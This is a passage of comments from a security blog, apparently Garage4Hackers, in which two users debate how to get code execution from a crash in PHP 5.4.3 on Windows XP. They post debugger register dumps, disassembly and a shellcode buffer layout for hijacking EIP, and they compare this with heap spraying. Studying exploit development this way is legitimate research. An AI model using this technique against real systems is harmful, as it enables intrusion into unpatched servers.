<iframe class="restrain" title="YouTube video player" width="640" height="390" src="../external.html?link=http://www.youtube.com/embed/QE8sebIwIno?wmode=opaque" frameborder="0"></iframe>

			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "614");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_615">
	<a name="comment615"></a>
	
		
			
				<a href="membere81f.html?u=8" class="avatarlink"><img src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" alt="fb1h2s's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_615">
		
			<a href="membere81f.html?u=8" class="username">fb1h2s</a>
		
		-
		<span class="postdate">12-02-2012 <span class="time">08:56 AM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_615">
			<blockquote class="posttext restore">
				Thanks for sharing the code and the showing intrest in the work.<br />
<br />
But pardon me am not getting what ur talking about how u were able to get code execution. <br />
<br />
In our case<br />
<br />
$vVar = new VARIANT(0x0110D410); // We controll this <br />
<br />
is not used directly for EIP but its the [ dword ptr [esi] ] .<br />
<br />
Here is the debugging output form the code u shared.<br />
<br />
Can u share the debugging output here please.<br />
<br />
Thanks Again, looking forward for more fruitful discussion on this.<br />
Cheers. <br />
<br />
(ac0.ac4): Access violation - code c0000005 (first chance)<br />
First chance exceptions are reported before any exception handling.<br />
This exception may be expected and handled.<br />
eax=00000000 ebx=00000000 ecx=00372ac8 edx=0114d9e0 esi=0110d410 edi=0114f230<br />
eip=102f59bd esp=00c1f988 ebp=00c1f9dc iopl=0         nv up ei pl zr na pe nc<br />
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246<br />
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\wamp\bin\php\php5.4.3\php5ts.dll - <br />
php5ts!php_strftime+0xadc:<br />
102f59bd 8b06            mov     eax,dword ptr [esi]  ds:0023:0110d410=????????<br />
0:000&gt; u<br />
php5ts!php_strftime+0xadc:<br />
102f59bd 8b06            mov     eax,dword ptr [esi]<br />
102f59bf 8d4dd4          lea     ecx,[ebp-2Ch]<br />
102f59c2 51              push    ecx<br />
102f59c3 53              push    ebx<br />
102f59c4 53              push    ebx<br />
102f59c5 56              push    esi<br />
102f59c6 ff5010          call    dword ptr [eax+10h]<br />
102f59c9 8b45d4          mov     eax,dword ptr [ebp-2Ch]<br />
<br />
My tests were done on:<br />
C:\wamp\www\phpbugs&gt;php.exe -v<br />
PHP 5.4.3 (cli) (built: May  8 2012 00:51:31)<br />
Copyright (c) 1997-2012 The PHP Group<br />
Zend Engine v2.4.0, Copyright (c) 1998-2012 Zend Technologies<br />
    with Xdebug v2.2.0, Copyright (c) 2002-2012, by Derick Rethans<br />
<br />
Winxp SP 3
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "615");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_616">
	<a name="comment616"></a>
	
		
			
				<a href="member4258.html?u=3489" class="avatarlink"><img src="550813_10151201455682497_370701521_nc1ce.jpg?u=3489&amp;dateline=1354339669&amp;type=thumb" alt="Rashid bhatt's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_616">
		
			<a href="member4258.html?u=3489" class="username">Rashid bhatt</a>
		
		-
		<span class="postdate">12-02-2012 <span class="time">05:11 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_616">
			<blockquote class="posttext restore">
				Hello ,<br />
<br />
See this is where the things go wrong <br />
<br />
============ module php5ts.dll =====================<br />
102F59BD   8B06             MOV EAX,DWORD PTR DS:[ESI] &lt;&lt; we control esi VARIANT(ESI) &lt;&lt;<br />
102F59BF   8D4D D4          LEA ECX,DWORD PTR SS:[EBP-2C]<br />
102F59C2   51               PUSH ECX<br />
102F59C3   53               PUSH EBX<br />
102F59C4   53               PUSH EBX<br />
102F59C5   56               PUSH ESI<br />
102F59C6   FF50 10          CALL DWORD PTR DS:[EAX+10] &lt;&lt; this is the place we can control EIP<br />
<br />
Now, if we put a break-point at 0x102F59BD EDI happens to point towards $buffer variable<br />
<br />
EAX 00000000<br />
ECX 003628E8<br />
EDX 0110DD78<br />
EBX 00000000<br />
ESP 00C1F9F8<br />
EBP 00C1FA4C<br />
ESI 0110D410 &lt;&lt; this is what we can control using VARIANT <br />
EDI 0110D410  &lt;&lt;&lt; $buffer<br />
<br />
EIP 102F59BD php5ts.102F59BD<br />
C 0  ES 0023 32bit 0(FFFFFFFF)<br />
P 1  CS 001B 32bit 0(FFFFFFFF)<br />
A 0  SS 0023 32bit 0(FFFFFFFF)<br />
Z 1  DS 0023 32bit 0(FFFFFFFF)<br />
S 0  FS 0038 32bit 7FFDE000(FFF)<br />
T 0  GS 0000 NULL<br />
D 0<br />
O 0  LastErr ERROR_SUCCESS (00000000)<br />
EFL 00000246 (NO,NB,E,BE,NS,PE,GE,LE)<br />
ST0 empty 1.#QNAN00000000000000<br />
<br />
<br />
<br />
$vVar = new VARIANT(0x0110D410); &lt;&lt; (this address might vary on your system ) make it as EDI is <br />
<br />
Now i have aligned the buffer in such a way that it will contain data in the following fashion <br />
<br />
$buffer = &quot;buffer_base&quot; . &quot;JUNK 12 BYTES&quot; . &quot;buffer_base + 10(hex)&quot; . &quot; SHELLCODE&quot;;<br />
<br />
Here MOV EAX,DWORD PTR DS:[ESI] as we control ESI we can load EAX with base address of $buffer cause [$buffer] = base_addr_base<br />
<br />
<br />
Later it happens to call a fucntion at + 10 offset of [eax] which in our buffer alignment points towards shellcode...<br />
<br />
ps:Because the author this exploit has already assumed that DEP/ASLR are turned off by default on the testing machine, This exploit is not likely going to work on systems running such protections.<br />
<br />
Thanks!
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "616");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_617">
	<a name="comment617"></a>
	
		
			
				<a href="membere81f.html?u=8" class="avatarlink"><img src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" alt="fb1h2s's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_617">
		
			<a href="membere81f.html?u=8" class="username">fb1h2s</a>
		
		-
		<span class="postdate">12-03-2012 <span class="time">07:21 AM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_617">
			<blockquote class="posttext restore">
				Hi bro that was helpfull thanks for letting me know there is an alternate way to solve this . <br />
When I started my aim was to make the code work on Win XP, 2003[majority of php server] {irrespective of service packs obviously} platforms and when I first looked at the crash the first thought was to use a heap spray to achieve this. May be coz of the style I follow, so that u don't need to hardcode any adress and making it reliable. <br />
<br />
The major issue with ur method is u need to know the exact adress of the following <br />
1)edi<br />
2)buffers base adress <br />
<br />
and these two would vary even on each service packs?<br />
Correct me if am wrong or you are able to solve that some way, lets keep this healthy discussion up.
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "617");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_618">
	<a name="comment618"></a>
	
		
			
				<a href="member4258.html?u=3489" class="avatarlink"><img src="550813_10151201455682497_370701521_nc1ce.jpg?u=3489&amp;dateline=1354339669&amp;type=thumb" alt="Rashid bhatt's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_618">
		
			<a href="member4258.html?u=3489" class="username">Rashid bhatt</a>
		
		-
		<span class="postdate">12-03-2012 <span class="time">07:08 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_618">
			<blockquote class="posttext restore">
				hello brother<br />
<br />
We only need need to know the buffer base address , edi is not required because edi by default points towards buffer. Moreover the kind of  spray you are doing is not effective, in case of this exploit the heap has to be sprayed at 4 byte boundaries and at the same time we don't know if our $buffer will be aligned at odd  or even byte boundary? <br />
<br />
Also when you use JMP EDI trampoline definitely your heap spray will contain instructions which might have bad side effects! anyways  ... lets work together on conversion of this exploit into an addresses disclosure bug!<br />
<br />
Cheers!
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "618");
	//-->
	</script>
</li><li class="postbit postbit-lite postcontainer " id="comment_620">
	<a name="comment620"></a>
	
		
			
				<a href="membere81f.html?u=8" class="avatarlink"><img src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" alt="fb1h2s's Avatar"/></a>
			
		
	
	
	
	<div class="commenthead">
	<div class="postbithead">
		<label for="comment_imod_checkbox_620">
		
			<a href="membere81f.html?u=8" class="username">fb1h2s</a>
		
		-
		<span class="postdate">12-05-2012 <span class="time">12:46 PM</span></span>
		</label>
	
	<div class="postbitfoot floatcontainer">
		<ul class="postcontrols">
			
			
			
		</ul>
	</div>
	</div>
	</div>
	<div class="content">
		<div id="comment_text_620">
			<blockquote class="posttext restore">
				Well in that case let be productive, we ill pick some other bug which is not public and try to make  an exploit out of it what say.
			</blockquote>
		</div>
		<div class="commentfoot floatcontainer">
			
		</div>
	</div>
	
	
	<script type="text/javascript">
	<!--
	vBulletin.register_control("vB_QuickEdit", "620");
	//-->
	</script>
</li>
	</ol>
	

	<div id="below_comments" class="floatcontainer">
		
	</div>

	<input type="hidden" name="s" value="" />
	<input type="hidden" name="securitytoken" value="guest" />
	<input type="hidden" name="b" value="394" />
	<input type="hidden" name="bt" value="" />
	<input type="hidden" name="url" value="" />
	<input type="hidden" name="userid" value="8" />
</form>








	
		<!-- Editor Scripts -->
<script type="text/javascript">
<!--

var CKEDITOR_BASEPATH = getBaseUrl() + 'clientscript/ckeditor/';

var ltr = 'left';



var ignorequotechars = 1;
var allowbasicbbcode = false;

// vB Phrases
vbphrase["must_enter_subject"]           = "You must enter a title / subject!";
vbphrase["message_too_short"]            = "The message you have entered is too short. Please lengthen your message to at least %1$s characters.";
vbphrase["click_quick_reply_icon"]       = "";
vbphrase["all_files"]                    = "All Files";
vbphrase["file_is_too_large"]            = "File is too Large";
vbphrase["invalid_file"]                 = "Invalid File";
vbphrase["maximum_number_of_attachments_reached"] = "Maximum number of attachments reached";

//-->
</script>
<!-- / Editor Scripts -->
		<script type="text/javascript" src="clientscript/ckeditor/ckeditor14ad.html?t=A7HG4HT&amp;v=421"></script><script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
	
<div id="ajax_post_errors" class="hidden">
	<div class="block">
		<div class="blockhead floatcontainer">
			<span class="blockhead_info"><input type="button" class="button" value=" X " id="quick_edit_errors_hide" /></span>
			<h2>vBulletin Message</h2>
		</div>
		<div class="blockbody">
			<div id="ajax_post_errors_message" class="blockrow">&nbsp;</div>
		</div>
		<div class="blockfoot">
			<a href="#" id="quick_edit_errors_cancel" class="textcontrol">Cancel Changes</a>
		</div>
	</div>
</div>
	<script type="text/javascript" src="clientscript/blog_quick_edit6719.html?v=421"></script>
	




	

	<h2 id="trackbacks_heading" class="commentsheader"><a name="trackbacks"></a>Trackbacks</h2>

	<div class="trackbacks_block">
		<span class="shade">Total Trackbacks</span> 0
	
		<div class="shade">
			<a href="entry133c.html?b=394" title="Trackback URL" class="shade">No other blogs currently reference this blog entry</a>
		</div>
	

		
		
		<div id="trackbackurl">
			Trackback URL: <input type="text" value="http://garage4hackers.com/blog_callback.php?b=394" onmouseover="this.select();" />
		</div>
		
	</div>

	


<script type="text/javascript">
<!--
	vBulletin.register_control("vB_QuickEdit_Blog_Entry", "394");
    extra = {
    //
    };

    extra.userid = "8";

    vBulletin.register_control("vB_AJAX_TagEditor", "vBBlog_BlogEntry", "394", "blog", extra);
//-->
</script>
<script type="text/javascript" src="clientscript/vbulletin_menu6719.html?v=421"></script>
<script type="text/javascript" src="clientscript/vbulletin_ajax_tageditor6719.html?v=421"></script>
			<!-- End main content -->
		        </div>
		</div>
	</div>
	<div id="sidebar_container"><h6 class="actionbutton_container">
	
		<a class="pagetitleinfo textcontrol" href="register.html" rel="nofollow"><span>+</span> Create Blog</a>
	
	</h6>

<div id="blog_user_sidebar">
	

	<div class="block mainblock">
		<div class="blocksubhead"><a class="username offline" href="membere81f.html?u=8">fb1h2s</a></div>
		<div id="userinfoblock" class="floatcontainer">
			
			<a class="avatar" href="membere81f.html?u=8" title="fb1h2s's Avatar">
				<span class="avatarcontainer"><img src="meb1c6.jpg?u=8&amp;dateline=1397117991&amp;type=profile" alt="fb1h2s's Avatar" /></span>
			</a>
			
				
			<ul class="list_no_decoration" id="usermenu">
				
					<li>
						<a href="membere81f.html?u=8"><img src="images/site_icons/profile.html" alt="Go to Profile" /> Go to Profile</a>
					</li>
				
				
				

				
				
				<li>
					<a href="blog4af1.html?u=8&amp;do=markread&amp;readhash=" rel="nofollow"><img src="images/site_icons/markasread.html" alt="Mark as Read" /> Mark as Read</a>
				</li>
				
				
			</ul>
		</div>

		<div class="blockbody">
			<div class="blockrow">
				<div id="userstats">
					
					<dl class="stats">
						<dt>Join Date</dt>
						<dd>Jul 2010</dd>
					</dl>
					
					
					<dl class="stats">
						<dt>Location</dt>
						<dd>India</dd>
					</dl>
					
					
					<dl class="stats">
						<dt>Posts</dt>
						<dd>616</dd>
					</dl>
					<dl class="stats">
						<dt>Blog Entries</dt>
						<dd>32</dd>
					</dl>
					
					
					
					
					
				</div>

				
			</div>		
		</div>
	</div>
	<div class="underblock"></div>

	

	

	

	<ul id="moveable_blocks">
		
		
		
		
		
		
		
		
	<li id="block_entries">
		<div class="block smaller moveable" id="block_entries_div">
			<div class="blocksubhead"  id="block_entries_handle">
				<a href="#top" id="collapse_c_blog_entries" class="collapse"><img id="collapseimg_blog_entries" src="images/buttons/collapse_40b.png" alt="" /></a>
				<a href="bloge81f.html?u=8">Recent Blog Posts</a>
			</div>
			<div class="blockbody" id="c_blog_entries">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry1698.html?b=3105">Maldrone the First Backdoor for drones.</a>
		
		<br />
		
		01-26-2015 <span class="time">09:26 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry5930.html?b=3103">Cracking a Captcha . Nullcon| EMC2 CTF 2015</a>
		
		<br />
		
		01-15-2015 <span class="time">05:01 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entrye3ad.html?b=3098">Pentesting a DVB-C network .Hacking your cable TV Network Part 1</a>
		
		<br />
		
		12-27-2014 <span class="time">07:23 PM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entry94bc.html?b=3087">Everything you need to know about CVE-2014-6271</a>
		
		<br />
		
		09-25-2014 <span class="time">05:45 AM</span>
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		<a href="entryf50f.html?b=3073">Low hanging Web Application bugs in Digital Cable :Hacking Cable TV Networks Part 1</a>
		
		<br />
		
		08-06-2014 <span class="time">03:30 AM</span>
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	<li id="block_comments">
		<div class="block smaller moveable" id="block_comments_div">
			<div class="blocksubhead"  id="block_comments_handle">
				<a href="#top" id="collapse_c_blog_comments" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
				<a href="bloge2b6.html?u=8&amp;do=comments">Recent Comments</a>
			</div>
			<div class="blockbody" id="c_blog_comments">
				<ul class="blockrow">
					<li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryb3ce.html?b=3105&amp;bt=3227#comment3227">Maldrone the First Backdoor for drones.</a>

		<br />

		
		<span class="shade">by <a href="member47d6.html?u=25275" rel="nofollow" class="shade">leeladitya</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entrye119.html?b=3087&amp;bt=3182#comment3182">Everything you need to know about CVE-2014-6271</a>

		<br />

		
		<span class="shade">by <a href="member93c5.html?u=21" rel="nofollow" class="shade">neo</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="images/misc/unknown.html" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryc255.html?b=392&amp;bt=3175#comment3175">Hacking RFID Acces Door .  Personal Diary #Non-Technical.</a>

		<br />

		
		<span class="shade">by <a href="memberf7ab.html?u=20549" rel="nofollow" class="shade">cipher</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="sss836c.png?u=238&amp;dateline=1333021046&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entryc62b.html?b=3069&amp;bt=3155#comment3155">How the Internet Bug bounty Killed an Exploit Kit.</a>

		<br />

		
		<span class="shade">by <a href="member5665.html?u=238" rel="nofollow" class="shade">[s]</a></span>
		
	</div>
</li><li class="avatarcontent floatcontainer">
	<a class="smallavatar">
		
		<img width="30" alt="" src="20130721_1819593501.jpg?u=8&amp;dateline=1400680840&amp;type=thumb" title=""/>
		
	</a>
	<div class="smallavatartext">
		
		
		<a href="entry3e65.html?b=785&amp;bt=871#comment871">DEP ASLR bypass without ROP JIT : CanSecWest2013 Slides and Analysis</a>

		<br />

		
		<span class="shade">by <a href="membere81f.html?u=8" rel="nofollow" class="shade">fb1h2s</a></span>
		
	</div>
</li>
				</ul>
			</div>
		</div>
		<div class="underblock"></div>
	</li>
<li id="block_archive">
	<div class="block blogusermenu" id="vb_blogcalendar">
		<div id="block_archive_div" class="calendar mini">
	<h4 class="blocksubhead smaller moveable" id="block_archive_handle">
		<a href="#top" id="collapse_c_blog_calendar" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
		Archive
	</h4>
	<div class="blockbody" id="c_blog_calendar">
		<table width="100%" class="blockrow">
			<tr>
				
					<th class="blocksubhead" align="center" id="vb_blogcalendar_prevmonth" prevmonth="1" prevyear="2015">
						&nbsp;
						
							<a href="blogb903.html?u=8&amp;m=1&amp;y=2015">&lt;</a>
						
						&nbsp;
					</th>
									
				<th class="blocksubhead" colspan="5" align="center" id="vb_blogcalendar_currentmonth">
					
						<a href="blog9b8e.html?u=8&amp;m=3&amp;y=2020">March 2020</a>
					
				</th>
				
					<th class="blocksubhead">
						&nbsp;&nbsp;&nbsp;
					</th>
 				
         		</tr>
			<tr align="center">
				<td class="blogsubheader">Su</td>
				<td class="blogsubheader">Mo</td>
				<td class="blogsubheader">Tu</td>
				<td class="blogsubheader">We</td>
				<td class="blogsubheader">Th</td>
				<td class="blogsubheader">Fr</td>
				<td class="blogsubheader">Sa</td>
			</tr>
			<tr><td class="othermonth">
	
		<span class="simpleday">23</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">24</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">25</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">26</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">27</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">28</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">29</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">1</span>
	
</td><td>
	
		<span class="simpleday">2</span>
	
</td><td>
	
		<span class="simpleday">3</span>
	
</td><td>
	
		<span class="simpleday">4</span>
	
</td><td>
	
		<span class="simpleday">5</span>
	
</td><td>
	
		<span class="simpleday">6</span>
	
</td><td>
	
		<span class="simpleday">7</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">8</span>
	
</td><td>
	
		<span class="simpleday">9</span>
	
</td><td>
	
		<span class="simpleday">10</span>
	
</td><td>
	
		<span class="simpleday">11</span>
	
</td><td>
	
		<span class="simpleday">12</span>
	
</td><td>
	
		<span class="simpleday">13</span>
	
</td><td>
	
		<span class="simpleday">14</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">15</span>
	
</td><td>
	
		<span class="simpleday">16</span>
	
</td><td>
	
		<span class="simpleday">17</span>
	
</td><td>
	
		<span class="simpleday">18</span>
	
</td><td>
	
		<span class="simpleday">19</span>
	
</td><td>
	
		<span class="simpleday">20</span>
	
</td><td>
	
		<span class="simpleday">21</span>
	
</td></tr><tr><td class="today" title="Today">
	
		<span class="simpleday">22</span>
	
</td><td>
	
		<span class="simpleday">23</span>
	
</td><td>
	
		<span class="simpleday">24</span>
	
</td><td>
	
		<span class="simpleday">25</span>
	
</td><td>
	
		<span class="simpleday">26</span>
	
</td><td>
	
		<span class="simpleday">27</span>
	
</td><td>
	
		<span class="simpleday">28</span>
	
</td></tr><tr><td>
	
		<span class="simpleday">29</span>
	
</td><td>
	
		<span class="simpleday">30</span>
	
</td><td>
	
		<span class="simpleday">31</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">1</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">2</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">3</span>
	
</td><td class="othermonth">
	
		<span class="simpleday">4</span>
	
</td></tr>
		</table>
	</div>
</div>
	</div>
	<div class="underblock"></div>
	<script type="text/javascript" src="clientscript/blog_ajax_calendar6719.js?v=421"></script>
	<script type="text/javascript">
	<!--
		blogCalendar = new vB_AJAX_BlogCalendar('blogCalendar', 'vb_blogcalendar', 3, 2020, 8);
	//-->
	</script>
</li>
<li id="block_visitors">
	<div class="block" id="block_visitors_div">
		<div class="blocksubhead" id="block_visitors_handle">
			<a href="#top" id="collapse_c_blog_visitors" class="collapse"><img id="collapseimg_blog_visitors" src="images/buttons/collapse_40b.png" alt="" border="0" /></a>
			Recent Visitors
		</div>
		<div class="blockbody" id="c_blog_visitors">
			<div class="blockrow">
				<ul id="recent_visitors_list" class="commalist">
					
						<li><a class="username" href="member1e56.html?u=26373">andymarcus</a>, </li>
					
						<li><a class="username" href="member3406.html?u=26190">em616</a>, </li>
					
						<li><a class="username" href="member8eb6.html?u=26085">Kabalu</a>, </li>
					
						<li><a class="username" href="member47d6.html?u=25275">leeladitya</a>, </li>
					
						<li><a class="username" href="memberfeac.html?u=25980">nitmalviya03</a>, </li>
					
						<li><a class="username" href="memberdb7f.html?u=25940">noor46968</a>, </li>
					
						<li><a class="username" href="member0297.html?u=26164">shadowfox</a>, </li>
					
						<li><a class="username" href="member9e83.html?u=25329">stnlrgrs</a>, </li>
					
						<li><a class="username" href="member2ab6.html?u=26103">tannyl</a>, </li>
					
						<li><a class="username" href="memberb428.html?u=25907">Test12</a></li>
					
				</ul>
			</div>
		</div>
	</div>
	<div class="underblock"></div>
</li>

	<li id="block_category">
		<div class="block categoryblock" id="block_category_div">
			<div class="blocksubhead smaller moveable"  id="block_category_handle">
				<a href="#top" id="collapse_c_blog_categories" class="collapse"><img src="images/buttons/collapse_40b.png" alt="" /></a>
				
				Blog Categories
			</div>
			<div class="blockbody" id="c_blog_categories">
				<div class="blockrow">
					
					
						<h2 class="local">Local Categories</h2>
						<ul class="folderlist hideoverflow">
							
<li>
	<img src="images/misc/blog/folder.html" class="inlineimg" alt="Uncategorized" border="0" />
	
		
			<a href="blog71e7.html?u=8&amp;blogcategoryid=-1" title="Uncategorized">Uncategorized</a>
		
	
</li>
						</ul>
					
				</div>
			</div>
		</div>
		<div class="underblock"></div>
	</li>

	</ul>
	
	
</div></div>
	
	<div class="cleardiv"></div>
</div>


<div style="clear: left">
  
<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 468;
google_ad_height = 60;
google_ad_format = "468x60_as";
google_ad_type = "text_image";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script type="text/javascript"
  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>

  <div id="ad_global_above_footer"><div align="center">
<script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/9/10 */
google_ad_slot = "7101394260";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="../pagead2.googlesyndication.com/pagead/show_ads.js">
</script></div>
</div>

<div id="footer" class="floatcontainer footer">

	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">

		
			<select name="styleid" onchange="switch_id(this, 'style')">
				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
				
					
					<optgroup label="&nbsp;Standard Styles">
									
					
	<option value="1" class="" selected="selected">-- Default Style</option>

					
					</optgroup>
										
				
				
					
					<optgroup label="&nbsp;Mobile Styles">
					
					
	<option value="2" class="" >-- Default Mobile Style</option>

					
					</optgroup>
										
				
			</select>	
		
		
		
	</form>

	<ul id="footer_links" class="footer_links">
		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
		<li><a href="index.html">Garage4hackers</a></li>
		
		
		<li><a href="archive/index.html">Archive</a></li>
		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
		
		
		<li><a href="entry133c.html?b=394#top" onclick="document.location.hash='top'; return false;">Top</a></li>
	</ul>
	
	
	
	
	<script type="text/javascript">
	<!--
		// Main vBulletin Javascript Initialization
		vBulletin_init();
		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
	//-->
	</script>
        
</div>
</div> <!-- closing div for body_wrapper -->

<div class="below_body">
<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">04:21 PM</span>.</div>

<div id="footer_copyright" class="shade footer_copyright">
	<!-- Do not remove this copyright notice -->
	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
	<!-- Do not remove this copyright notice -->	
</div>
<div id="footer_morecopyright" class="shade footer_morecopyright">
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	
	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
	Copyright 2010 - 2017, Garage4Hackers
	
</div>
 

	<div id="fb-root"></div>
<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>

<script type="text/javascript">
<!--
	loadFacebookAPI('en_US');
	function fbAsyncInit()
	{
		vBfb = new vB_Facebook({
			appid : "170793809601191",
			connected : 0,
			active : 0,
			autoreg : 0,
			feed_newthread : 1,
			feed_postreply : 1,
			feed_blogentry : 1,
			feed_blogcomment : 1,
			feed_newarticle : 1,
			feed_articlecomment : 1
		});
	}
// -->
</script>

</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try{
var pageTracker = _gat._getTracker('UA-17311051-3');
pageTracker._trackPageview();
} catch(err) {}</script>
</body>
</html>